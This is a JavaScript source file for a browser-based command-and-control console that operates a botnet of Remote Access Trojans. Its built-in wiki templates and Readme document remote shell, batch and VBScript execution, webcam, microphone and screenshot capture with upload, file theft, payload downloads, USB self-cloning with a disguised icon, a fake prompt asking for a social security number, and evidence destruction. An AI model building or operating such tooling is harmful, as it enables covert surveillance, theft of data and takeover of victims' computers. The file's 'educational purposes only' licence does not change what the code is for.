const typer = (x) => {
 toast.publish({
  type: "robot",
  hideClose: true,
  description: `Initializing Autopilot...`,
  timeout: 1500,
 });
 hotrelod = false;
 document.getElementById("backdrop").style.display = "block";
 document.getElementById("ebar").setAttribute("class", "toolbar inbar nohover");
 document.getElementById("assets").setAttribute("class", "nobtn");
 const t0 = performance.now();
 if (document.getElementById("fne").textContent == "Readme.md" || document.getElementById("fne").textContent == "License.txt") {
  document.getElementById("readonly").style.display = "none";
  document.getElementById("editor").style.display = "block";
  document.getElementById("ide").setAttribute("class", "pretty-split-pane-component-inner logo");
  shakeSpeare(x, t0);
 } else {
  if (editor.getValue().length != 0) {
   let eraser = setInterval(function () {
    // console.log("clearing code...");
    editor.getSession().setValue(editor.getValue().slice(0, -1));
    if (editor.getValue().length == 0) {
     clearInterval(eraser);
     shakeSpeare(x, t0);
    }
   }, 0);
  } else {
   shakeSpeare(x, t0);
  }
 }
};

// Wiki Section
const shakeSpeare = (x, y) => {
 document.getElementById("fne").textContent = "Program-" + x + ".fdm";
 let tale;
 switch (x) {
  case 1:
   tale = `// |================================================|\n// | Program-${x}\n// | Description: Delete RATs from All Systems.\n// | Warning: This Action is Irreversible!\n// |________________________________________________|\n\nPC.All(); // Selects All Systems.\nPC.Escape(); // Initiate Escape Sequence.\n\n`;
   break;
  case 2:
   tale = `// |================================================|\n// | Program-${x}\n// | Description: Deletes a Specific RAT\n// | Warning: This Action is Irreversible!\n// |________________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'.\nPC.Escape(); // Initiate Escape Sequence. \n\n`;
   break;
  case 3:
   tale = `// |================================================|\n// | Program-${x}\n// | Description: Checks if a RAT is Online\n// | Response: POLO!\n// |________________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'.\nPC.Marco(); // Returns Polo if Online\n\n`;
   break;
  case 4:
   tale = `// |===================================================|\n// | Program-${x}\n// | Description: Temporarily end Botnet execution.\n// | Warning: This makes All systems go Offline.\n// |___________________________________________________|\n\nPC.All(); // Selects All Systems.\nPC.Exit(); // End the process.\n\n`;
   break;
  case 5:
   tale = `// |======================================================|\n// | Program-${x}\n// | Description: Temporarily end a specific RAT Process\n// | Warning: This makes the RAT go Offline.\n// |______________________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'.\nPC.Exit(); // End the process\n\n`;
   break;
  case 6:
   tale = `// |==============================================|\n// | Program-${x}\n// | Description: Update All RAT's firmware.\n// | Warning: This Action is Irreversible!\n// |______________________________________________|\n\nPC.All(); // Selects All systems.\nPC.Update("https://www..."); // URL to the firmware file\n \n`;
   break;
  case 7:
   tale = `// |================================================|\n// | Program-${x}\n// | Description: Update a Specific RAT's firmware.\n// | Warning: This Action is Irreversible!\n// |________________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'.\nPC.Update("https://www..."); // URL to the firmware file\n\n`;
   break;
  case 8:
   tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: Enter hibernation mode for All Systems.\n// |  Note: However each RAT Will issue a single-\n// |  heartbeat signal on first startup of the day.\n// |______________________________________________________|\n\nPC.All(); // Selects All Systems.\nPC.Hibernate("15-01-2030"); // In DD-MM-YY Format.\n\n`;
   break;
  case 9:
   tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: Enter hibernation for a specific RAT.\n// |  Note: However the RAT Will issue a single-\n// |  heartbeat signal on first startup of the day.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Hibernate("15-01-2030"); // In DD-MM-YY Format.\n\n`;
   break;
  case 10:
   tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: End hibernation of RAT(s).\n// |  Note: Make sure the bonet / RAT is Online.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Revive();\n\n`;
   break;
  case 11:
   tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: Start Cloning to any connected USB.\n// |  Warning: May arise suspicion.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Clone("Name","https://www..."); // Format: Alias Name, Icon URL\n\n`;
   break;
  case 12:
   tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: Terminates Cloning Operations.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.NClone(); // Halt Cloning\n\n`;
   break;
  case 13:
   tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: Remote VBScript Execution.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Vbs(\`\nX=Msgbox("Message Here..",0+16,"Title..")\n\`);\n/*\nFormat: X + Y + Z\nX => 0: OK\n     1: OK, CANCEL\n     2: ABORT, RETRY,IGNORE\n     3: YES, NO, CANCEL\n     4: YES, NO\nY => 16: CRITICAL ICON\n     32: QUESTION ICON\n     48: WARNING ICON\n     64: INFO ICON\nZ => 0: NORMAL\n     4096: ALWAYS ON TOP\n*/\n\n`;
   break;
  case 14:
   tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: Remote .cmd/.bat script Execution.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Bat(\`\n@echo off\nREM This is a comment.\necho Hola!\npause\n\`);\n \n`;
   break;
  case 15:
   tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: Remote Shell Execution.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Shell("echo %username%"); // Run Inline CMD Commands..\n\n`;
   break;
  case 16:
   tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: Remote Text-to-Speech(TTS).\n// |  Warning: Make sure an audio device is present.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Speak("Hello..."); // Speak specific words.\n\n`;
   break;
  case 17:
   tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: Plays a Remote Audio file(mp3).\n// |  Warning: Make sure an audio device is attached.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Play("https://raw.githubusercontent.com/A5H1Q/The-Flying-Dutchman/master/Assets/cena.mp3");\n\n`;
   break;
  case 18:
   tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: Displays a Timed messagebox.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Timebox("Message Here..",0,16,"Title..",5000);\n/*\nFormat: X,Y\nX => 0: OK (Default)\n     1: OK, CANCEL\n     2: ABORT, RETRY,IGNORE\n     3: YES, NO, CANCEL\n     4: YES, NO\nY => 16: CRITICAL ICON (Default)\n     32: QUESTION ICON\n     48: WARNING ICON\n     64: INFO ICON\n*/\n \n`;
   break;
  case 19:
   tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: Shows Various Dialog boxes.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Info("This is an Información.."); // Info box\nPC.Warn("This is an Warning.."); // Warning box\nPC.Error("This is an Error.."); // Error box\n\n`;
   break;
  case 20:
   tale = `// |==============================================|\n// |  Program-${x}\n// |  Description: Live Sessions.. \n// |________________________________________________|\n\nvar bot="A01";\nPC.Lock(bot);\n// Probly Websockets ...\n\n`;
   break;
  case 21:
   tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: Prompts user for an input.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Prompt("Where you At? ");\nPC.Warn("Are you sure about that? ");\nPC.Prompt("Whats your social security No.? ");\n\n`;
   break;
  case 22:
   tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: Google a selected Query.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Google("How to get away with murder?");\n`;
   break;
  case 23:
   tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: Navigates to a specific URL.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Web("https://www.youtube.com"); // Opens in browser.\n\n`;
   break;
  case 24:
   tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: Rename a Remote Access Trojan (RAT).\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Rename("A02"); // New Name: 'A02'.\n\n`;
   break;
  case 25:
   tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: Flashes Screen as a Visual Indication\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Flash();\n\n`;
   break;
  case 26:
   tale = `// |========================================================|\n// |  Program-${x}\n// |  Description: Retrieves System Info.\n// |________________________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'\nPC.Details(); // Returns PC Info.\n\n`;
   break;
  case 27:
   tale = `// |=================================================|\n// |  Program-${x}\n// |  Description: Shutsdown the system. .\n// |_________________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'\nPC.Shutdown(4000); // Shutsdown after 4 sec.\n\n`;
   break;
  case 28:
   tale = `// |========================================================|\n// |  Program-${x}\n// |  Description: Reports back a RAT's working conditions.\n// |________________________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'\nPC.Health(); // Returns Status Report\n\n`;
   break;
  case 29:
   tale = `// |========================================================|\n// |  Program-${x}\n// |  Description: Retrieves Storage Info.\n// |________________________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'\nPC.Disk(); // Returns Disk Info.\n\n`;
   break;
  case 30:
   tale = `// |========================================================|\n// |  Program-${x}\n// |  Description: Retrieves Directory / Folder structures.\n// |________________________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'\nPC.Tree("C:\.."); // Returns Info.\n\n`;
   break;
  case 31:
   tale = `// |==============================================|\n// |  Program-${x}\n// |  Description: Fetches a file from target\n// |______________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'\nPC.Send("https://www..."); // File Upload URL.\n\n`;
   break;
  case 32:
   tale = `// |==============================================|\n// |  Program-${x}\n// |  Description: Downloads a file onto target.\n// |______________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'\nPC.Download("https://www..."); // URL of Remote File.\n\n`;
   break;
  case 33:
   tale = `// |==============================================|\n// |  Program-${x}\n// |  Description: Capture Audio from target.\n// |______________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'\nPC.Mic("https://www...",1); // File Upload URL and Record for 1 min.\n\n`;
   break;
  case 34:
   tale = `// |==============================================|\n// |  Program-${x}\n// |  Description: Return list of active applications.\n// |______________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'\nPC.Log();\n\n`;
   break;
  case 35:
   tale = `// |==============================================|\n// |  Program-${x}\n// |  Description: Captures a Photo.\n// |  Warning: May arise suspicion.\n// |______________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'\nPC.Camera("https://www..."); // File Upload URL.\n\n`;
   break;
  case 36:
   tale = `// |==============================================|\n// |  Program-${x}\n// |  Description: Take a Screenshot.\n// |  Warning: May arise suspicion.\n// |______________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'\nPC.Screenshot("https://www..."); // File Upload URL.\n\n`;
   break;
  case 37:
   tale = `// |==============================================|\n// |  Program-${x}\n// |  Description: Timed Execution.\n// |______________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'\nPC.ExecuteAt("14:59");\nPC.Info("Wake wakey..");\n\n`;
   break;
  case 38:
   tale = `// |==============================================|\n// |  Program-${x}\n// |  Description: Execute and Escape.\n// |  Warning: This action is irreversible.\n// |______________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'\nPC.Excape("echo Good bye...");\n\n`;
   break;
  default:
   alert("Wiki not found!");
   break;
 }
 let s = 0;
 let ink = setInterval(function () {
  editor.getSession().setValue(tale.substring(0, s));
  s++;
  if (s === tale.length) {
   clearInterval(ink);
   document.getElementById("ebar").setAttribute("class", "toolbar inbar");
   document.getElementById("assets").setAttribute("class", "");
   document.getElementById("backdrop").style.display = "none";
   hotrelod = true;
   editor.getSession().setValue(editor.getValue() + " ");
   //    editor.navigateLineEnd();
   const t1 = performance.now();
   let ms = t1 - y;
   ms /= 1000;
   let latency = Math.round((ms + Number.EPSILON) * 100) / 100;
   toast.publish({
    type: "robot",
    hideClose: true,
    description: `Finished writing in  ${latency} sec`,
    timeout: 2000,
   });
  }
 }, 1);
};

const lawyer = (l) => {
 if (hotrelod) {
  document.getElementById("editor").style.display = "none";
  document.getElementById("readonly").style.display = "block";
  document.getElementById("run").setAttribute("class", "menubar-item nohover");
  document.getElementById("ide").setAttribute("class", "pretty-split-pane-component-inner logo read");

  if (l == 0) {
   document.getElementById("fne").textContent = "Readme.md";
   document.getElementById("readonly").innerHTML = `===================================
       DOCUMENTATION
===================================

Version : 4.1.0
Last Updated : 24 March 2022


    INTRODUCTION
-----------------------------------

        This is a browser based implementation of an integrated Environment and an embedded JS Runtime (ace-editor) designed to control Remote Access Trojans (RATs) in a distributed RAT Network (botnet). The interface is designed to simulate a basic command and control facility for the communication of RATs in a Network. All RATs on the network are pre-programmed to follow a set of built-in functions. A few examples are provided in the Wiki section. Permission for is granted only for Educational purposes, and are strictly subjected to the conditions specified in the license agreement.


    PREREQUISITES 
-----------------------------------
> Read URL: Used by botnet for Reading commands.
> Write URL: URL for Writing Instructions.
> Launch Codes: Access codes for writing previlaged commands.


 TARGET SELECTORS
-----------------------------------------
1) <b>All()</b> - Select All Available targets.
2) <b>Class(x)</b> - Selects a Group of Targets. Where 'x' is the Group identifier.
3) <b>Lock(x)</b> - Select a specific target, Denoted by 'x'

 LIST OF FUNCTIONS
-------------------------------------
I) Functions without Arguments: 
----------------------------------------------------
  a) For single systems
      1) <b>Marco()</b> - Returns Polo if Online
      2) <b>Details()</b> - Retrieves PC Info
      3) <b>Log()</b> - Return list of active applications.
      4) <b>Disk()</b> - Retrieves Disk Info
      5) <b>Health()</b> - Reports back a RAT's working conditions.

  b) For Multiple systems
      1) <b>Escape()</b> - Destroy Evidence and Escape
      2) <b>Exit()</b> - End Execution temporarily.
      3) <b>Revive()</b> - End Hibernation  
      4) <b>Flash()</b> - Flashes Screen, Visual Indication
      5) <b>NClone()</b> - Stops Cloning Operations

II) Functions With Arguments: 
----------------------------------------------------
  a) For single systems
      1) <b>Rename(x)</b> - Renames RAT
      2) <b>Camera(x)</b> - Captures a Photo
      3) <b>Mic(x,y)</b> - Records audio and uploads file.
      4) <b>Tree(x)</b> - Retrieves Directory / Folder structures
      5) <b>Send(x)</b> - Uploads a File
      6) <b>Prompt(x)</b> - Prompts user for an input.
      7) <b>Clone(x,y)</b> - Initiate Clone Operations

  b) For Multiple systems
      1) <b>Update(x)</b> - Updates firmware file
      2) <b>Hibernate(x)</b> -  till date
      3) <b>Excape(x)</b> - Execute Batch script and Escape()
      4) <b>Vbs(x)</b> - Runs .VBS Script
      5) <b>Bat(x)</b> - Runs .Bat Script
      6) <b>Shell(x)</b> - Runs Shell Commands
      7) <b>Speak(x)</b> - Text to Speech
      8) <b>Play(x)</b> - Play a Remote (mp3) Audio File (URL)
      9) <b>Info(x)</b> - Shows Info box
      10) <b>Warn(x)</b> - Shows Warning Box
      11) <b>Error(x)</b> - Shows Error box
      12) <b>Google(x)</b> - Googles selected Text
      13) <b>Web(x)</b> - Navigates to 'x' url
      14) <b>Type(x)</b> - Types custom text
      15) <b>Screenshot(x)</b> - Takes a Screenshot
      16) <b>Delay(x)</b> - Pause Execution temporarily for 'x' ms
      17) <b>Shutdown(x)</b> - Shutsdown the system after 'x' ms"
      18) <b>Download(x)</b> - Downloads a file onto target.
      19) <b>ExecuteAt(x)</b> - Executes script at specified time.
      20) <b>Timebox(x,y)</b> - Shows Msg Box fo 'y' ms


 EXAMPLE
----------------------------------------------------
Eg: PC.Lock("A01");<i> // Selects 'A01'</i>
      PC.Shutdown(4000);<i> // Shutsdown after 4 sec.
      // See Wiki for more examples</i>

- Happy Hacking 🎉

`;
  } else {
   document.getElementById("fne").textContent = "License.txt";
   document.getElementById("readonly").innerHTML = `===================================
       LICENSE / TERMS OF USE
===================================

Author: Ashik saleem

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), for use in a manner of educational purposes only, and are strictly subjected to the following conditions:-

1. USAGE FOR HACKING OR ANY ILLEGAL MEANS IS STRICTLY PROHIBITED. IN SUCH AN EVENT THE ORIGINAL OWNER IS NOT, IN ANY MANNER OF FORM RESPONSIBLE FOR THE DAMAGES CAUSED..
2. USAGE OF THIS SOFTWARE AS A COMMAND AND CONTROL FACILITY IS STRICTLY FORBIDDEN.
3. ANY ILLEGAL ACTIVITY INVOLVING THIS SOFTWARE MAY AUTOMATICALLY REVOKE THIS AGREEMENT.
4. THIS COPYRIGHT / PERMISSION NOTICE SHALL BE INCLUDED IN ALL COPIES AND IS APPLICABLE TO ALL PORTIONS OF THE SOFTWARE..
5. RESPECT PRIVACY, DONT BE A D*CK.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, AND IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

`;
  }
 }
};
